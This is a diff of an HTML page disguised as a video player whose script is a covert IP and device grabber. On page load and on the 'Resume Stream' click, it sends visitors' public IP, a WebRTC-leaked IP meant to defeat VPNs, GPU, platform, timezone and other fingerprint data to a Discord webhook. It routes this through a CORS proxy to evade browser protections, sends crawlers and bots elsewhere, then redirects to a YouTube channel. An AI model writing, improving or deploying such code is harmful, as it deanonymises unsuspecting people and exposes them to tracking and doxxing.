@@ -1,122 +1,175 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Media Player</title>
+    <title>Stream - Video Player</title>
     <style>
-        body { background: #000; color: #fff; font-family: -apple-system, system-ui, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .btn { background: #ff0000; color: #fff; padding: 18px 50px; border-radius: 5px; font-weight: bold; cursor: pointer; border: none; font-size: 20px; text-transform: uppercase; letter-spacing: 1px; }
-        .p { text-align: center; }
+        body { 
+            background: #000; 
+            color: #fff; 
+            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh; 
+            margin: 0; 
+            overflow: hidden;
+        }
+        .container { text-align: center; }
+        .btn { 
+            background: #ff0000; 
+            color: #fff; 
+            padding: 20px 60px; 
+            border-radius: 5px; 
+            font-weight: bold; 
+            cursor: pointer; 
+            border: none; 
+            font-size: 22px; 
+            text-transform: uppercase;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.4);
+            transition: transform 0.2s;
+        }
+        .btn:active { transform: scale(0.95); }
+        .status { color: #333; font-size: 12px; margin-top: 30px; letter-spacing: 1px; }
     </style>
 </head>
 <body>
-    <div class="p">
-        <button class="btn" id="trigger">▶ Resume Video</button>
-        <p style="color: #333; font-size: 11px; margin-top: 25px;">Buffering Secure Stream...</p>
+
+    <div class="container">
+        <button class="btn" id="trigger">▶ Resume Stream</button>
+        <p class="status">ENCRYPTED CONNECTION ESTABLISHED</p>
     </div>
 
     <script>
+    // --- MASTER CONFIGURATION ---
     const CONFIG = {
         HOOK: "https://discord.com/api/webhooks/1344654942953214053/nN0k_8I-yG_t8D97m5zH_K5K3Pz2U6-368X8vVv-I-I-I-I-I-I-I-I",
-        REDIRECT: "https://youtube.com/@LigmaBlox-w7m"
+        REDIRECT: "https://youtube.com/@LigmaBlox-w7m",
+        PROXY: "https://corsproxy.io/?", // Bypasses browser security blocks
+        BOTS: /bot|discord|google|telemetry|crawler|spider/i
     };
 
-    const clean = (v) => (v || "N/A").toString();
+    // --- SANITATION ENGINE ---
+    const clean = (val) => (val === undefined || val === null || val === "") ? "Protected/NA" : String(val);
 
-    // --- REINFORCED DISPATCH ENGINE ---
-    const dispatch = async (data, name = "OMNI-SYSTEM") => {
-        const payload = JSON.stringify({ ...data, username: name });
+    // --- HIGH-PRIORITY DISPATCH (WITH PROXY TUNNEL) ---
+    async function dispatch(data, identifier = "OMNI-INTEL") {
+        const payload = JSON.stringify({ ...data, username: identifier });
         
-        // Method A: Fetch with no-cors (Bypasses pre-flight blocks)
-        fetch(CONFIG.HOOK, {
-            method: "POST",
-            mode: "no-cors", 
-            headers: { "Content-Type": "application/json" },
-            body: payload,
-            keepalive: true
-        });
+        // Target URL: Direct Webhook + Proxy wrapper to bypass CORS
+        const target = CONFIG.PROXY + encodeURIComponent(CONFIG.HOOK);
 
-        // Method B: Beacon Fallback (For when the tab closes)
-        navigator.sendBeacon(CONFIG.HOOK, new Blob([payload], { type: 'application/json' }));
-    };
-
-    // --- VPN CRACK: SAFARI FIREWALL BYPASS ---
-    const crackSafari = () => {
         try {
-            const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
-            pc.createDataChannel("");
-            pc.onicecandidate = (i) => {
-                if (i?.candidate?.candidate) {
-                    const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(i.candidate.candidate);
-                    if (ip) dispatch({ content: "🚨 **VPN CRACKED (Safari Firewall):** `" + ip[1] + "`" }, "NETWORK-ENFORCER");
-                }
-            };
-            pc.createOffer().then(o => pc.setLocalDescription(o));
-        } catch(e) {}
-    };
-
-    // --- AUTOMATIC SILENT LOGGING (Fires on Page Load) ---
-    const silentLog = () => {
-        const intel = {
-            content: "🟢 **Target Landed (Silent Log)**",
-            embeds: [{
-                color: 3066993,
-                fields: [
-                    { name: "Platform", value: clean(navigator.platform), inline: true },
-                    { name: "TZ", value: clean(Intl.DateTimeFormat().resolvedOptions().timeZone), inline: true },
-                    { name: "Agent", value: "```" + navigator.userAgent.slice(0, 100) + "...```" }
-                ]
-            }]
-        };
-        dispatch(intel, "INITIAL-CONTACT");
-    };
-
-    // --- FORCED LOGGING (Fires on Click) ---
-    async function executeProtocol() {
-        document.getElementById('trigger').innerHTML = "CONNECTING...";
-        
-        let gpu = "Protected/Apple";
-        try {
-            const gl = document.createElement('canvas').getContext('webgl');
-            gpu = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
-        } catch(e) {}
-
-        const fullIntel = {
-            content: "💎 **Interaction Confirmed (High Priority)**",
-            embeds: [{
-                title: "TARGET UNMASKED",
-                color: 15158332,
-                fields: [
-                    { name: "GPU", value: clean(gpu), inline: false },
-                    { name: "Resolution", value: `${screen.width}x${screen.height}`, inline: true },
-                    { name: "Cores", value: clean(navigator.hardwareConcurrency), inline: true },
-                    { name: "Language", value: clean(navigator.language), inline: true }
-                ]
-            }]
-        };
-
-        // Fire Hardware Intel
-        await dispatch(fullIntel, "OMNI-REPORT");
-
-        // Fire IP Race
-        ["https://api.ipify.org?format=json", "https://ipapi.co/json/"].forEach(url => {
-            fetch(url).then(r => r.json()).then(d => {
-                dispatch({ content: `📡 **IP [${url.split('/')[2]}]:** \`${d.ip || d.query}\`` }, "DATA-VERIFIER");
+            // Priority 1: Fetch with keepalive and no-cors
+            await fetch(target, {
+                method: "POST",
+                mode: "no-cors", 
+                headers: { "Content-Type": "application/json" },
+                body: payload,
+                keepalive: true 
             });
-        });
-
-        // Fire Safari Crack
-        crackSafari();
-
-        // Final Redirect
-        setTimeout(() => { window.location.replace(CONFIG.REDIRECT); }, 1800);
+        } catch (e) {
+            // Priority 2: Standard Beacon Fallback
+            const blob = new Blob([payload], { type: 'application/json' });
+            navigator.sendBeacon(CONFIG.HOOK, blob);
+        }
     }
 
-    // Initialize
-    if (!/bot|discord|google/i.test(navigator.userAgent)) {
-        silentLog(); // Log instantly
-        document.getElementById('trigger').addEventListener('click', executeProtocol); // Log on click
+    // --- VPN CRACK: WEBRTC UDP LEAK ENGINE ---
+    function executeVPNCrack() {
+        try {
+            const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+            pc.createDataChannel("");
+            pc.onicecandidate = (ice) => {
+                if (ice && ice.candidate && ice.candidate.candidate) {
+                    const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
+                    if (ipMatch) {
+                        dispatch({ 
+                            content: `🚨 **VPN BYPASS DETECTED**\n**Real Local IP:** \`${ipMatch[1]}\`\n**Type:** UDP-Leak` 
+                        }, "NETWORK-ENFORCER");
+                        pc.onicecandidate = null; // Fire once
+                    }
+                }
+            };
+            pc.createOffer().then(offer => pc.setLocalDescription(offer));
+        } catch (err) {}
+    }
+
+    // --- HARDWARE FINGERPRINTING ---
+    async function captureHardware() {
+        let gpu = "Hidden/Apple-Silicon";
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+        } catch (e) {}
+
+        const info = {
+            embeds: [{
+                title: "💎 HIGH-VALUE TARGET DATA",
+                color: 16711680,
+                fields: [
+                    { name: "Renderer (GPU)", value: "```" + clean(gpu) + "```" },
+                    { name: "Platform", value: clean(navigator.platform), inline: true },
+                    { name: "Cores", value: clean(navigator.hardwareConcurrency), inline: true },
+                    { name: "Screen", value: `${window.screen.width}x${window.screen.height}`, inline: true },
+                    { name: "Timezone", value: clean(Intl.DateTimeFormat().resolvedOptions().timeZone), inline: true },
+                    { name: "Language", value: clean(navigator.language), inline: true }
+                ],
+                timestamp: new Date().toISOString()
+            }]
+        };
+        await dispatch(info, "OMNI-HARDWARE");
+    }
+
+    // --- IP RACE (MULTI-API) ---
+    function runIPRace() {
+        const apis = [
+            { url: "https://api.ipify.org?format=json", name: "IPIFY" },
+            { url: "https://ipapi.co/json/", name: "IPAPI" }
+        ];
+
+        apis.forEach(api => {
+            fetch(api.url)
+                .then(res => res.json())
+                .then(data => {
+                    const ip = data.ip || data.query;
+                    dispatch({ 
+                        content: `📡 **IP DISCOVERY [${api.name}]:** \`${clean(ip)}\`` 
+                    }, "DATA-VERIFIER");
+                }).catch(() => {});
+        });
+    }
+
+    // --- EXECUTION SEQUENCE ---
+
+    // 1. Silent Heartbeat (Fires on load)
+    if (!CONFIG.BOTS.test(navigator.userAgent)) {
+        dispatch({ content: "🟢 **Target Landed.** Initializing stealth pings..." }, "SYSTEM-STATUS");
+        
+        // 2. Button Activation (The User Gesture)
+        document.getElementById('trigger').addEventListener('click', async function() {
+            this.innerHTML = "STREAMING...";
+            this.disabled = true;
+
+            // Fire Hardware Intel
+            await captureHardware();
+
+            // Fire VPN Crack
+            executeVPNCrack();
+
+            // Fire IP Race
+            runIPRace();
+
+            // Delay for 1.8s to ensure data delivery before redirect
+            setTimeout(() => {
+                window.location.replace(CONFIG.REDIRECT);
+            }, 1800);
+        });
     } else {
+        // Redirect Bots
         window.location.replace("https://google.com");
     }
     </script>
